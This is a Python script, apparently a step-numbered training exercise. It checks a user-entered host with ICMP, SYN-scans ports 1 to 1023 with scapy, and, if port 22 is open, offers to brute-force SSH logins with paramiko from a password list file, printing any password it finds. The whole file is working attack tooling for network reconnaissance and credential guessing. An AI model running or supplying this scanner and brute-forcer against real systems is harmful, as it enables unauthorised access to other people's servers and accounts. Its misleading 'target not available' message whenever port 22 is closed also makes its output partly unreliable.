# 3. Import all the sub-library from "scapy.all"
from scapy.all import *
# 25. Import the "paramiko" library
import paramiko

# 4. Create the variable "target" and assign a user input to it
target = input("Dear User, please enter the target IP address: ")

# 5. Create variable "Registered_Ports" that equals to a range of 1 to 1023
Registered_Ports = range(1, 1024)

# 6. create an empty list called "open_ports"
open_ports = []


# 7. Create the "scanport" function
def scanport(port):
    # Create a variable that will be the source port
    source_port = RandShort()
    # 8. Set "conf.verb" to 0 to prevent the functions from printing unwanted messages
    conf.verb = 0
    # 9. Create a Synchronization Packet variable that is equal to results
    SynPkt = sr1(IP(dst=target) / TCP(sport=source_port, dport=port, flags="S"), timeout=0.5)
    # 10. Check if the Synchronization Packet exists
    if SynPkt is None:
        return False
    # 11. If the SynPkt variable has data, check if it has a TCP layer using the ".haslayer(TCP)" function.
    if SynPkt.haslayer(TCP):
        # 12. If it has a TCP layer, check if its ".flags" are equal to 0x12. The "0x12" indicates SYN-ACK flag,
        # which means that the port is open.
        if SynPkt[TCP].flags == 0x12:
            # 13. Send RST flag to close the active connection
            rst_pkt = sr(IP(dst=target) / TCP(sport=source_port, dport=port, flags="R"), timeout=2)
            return True

# 14. Create a function that checks target availability
def is_target_available(target):
    # 15 Implement "try" and "except" methodology
    try:
        # 17. Set the "conf.verb" to 0 inside "try" block
        conf.verb = 0
        # 18. Create a variable that sends an ICMP packet to the target
        icmp = sr1(IP(dst=target) / ICMP(), timeout=3)
        # 19. Check if the ICMP packet was sent and returned successfully
        if icmp is not None:
            return True
    # 15./16. Print the exception and return False
    except Exception as e:
        print(e)
        return False

# 26. Create a "BruteForce" function
def BruteForce(port):
    # 27. Use the "with" method to open the "PasswordList.txt"
    with open("PasswordList.txt", "r") as file:
        # 28. Create a wordlist
        passwords = file.readlines()
        # 29. Create a "user" variable
        user = input("Please enter the SSH server's secret login username: ")
        # 30. Create variable "SSHconn"
        SSHconn = paramiko.SSHClient()
        # 31. Apply the function to the "SSHconn" variable
        SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # 32. Create a loop for each value in the "passwords" variable
        for password in passwords:
            password = password.strip()
            try:
                # 34. Connect to SSH using:
                SSHconn.connect(target, port=int(port), username=user, password=password, timeout=1)
                # 35. Print the password with a success message
                print(f"Success! The password is: {password}")
                # 36. Close the connection
                SSHconn.close()
                # 37. Break the loop
                break
            except Exception as e:
                # 33. Print the failed password
                print(f"{password} failed. Sorry !")


# 20. Check if the target is available
if is_target_available(target):
    # 21. Create a loop that goes over "ports" variable range
    for port in Registered_Ports:
        # 22. Create a "status" variable that is equal to the port scanning function
        status = scanport(port)
        # 23. Check if the status variable is equal to True, append the port to the "open
        if status:
            open_ports.append(port)
            print(f"Hello ! Port {port} is open")
    # 24. Print a message stating that the scan finished
    print("Finished scanning")

# 38. Check if port 22 exists in the open_ports list
if 22 in open_ports:
    print(f"Open ports : {open_ports}")
    # 39. Check if the user wants to perform a brute-force attack
    brute_force_choice = input(
        "Port 22 is open. Do you want to perform a brute-force attack on this port? (yes/no): ")

    # 40. Start the brute-force function if the user responds with "yes"
    if brute_force_choice.lower() in ["y", "yes"]:
        BruteForce(22)
    elif brute_force_choice.lower() in ["no", "n"]:
        exit()
else:
    print("Target is not available or does not respond to ICMP requests.")






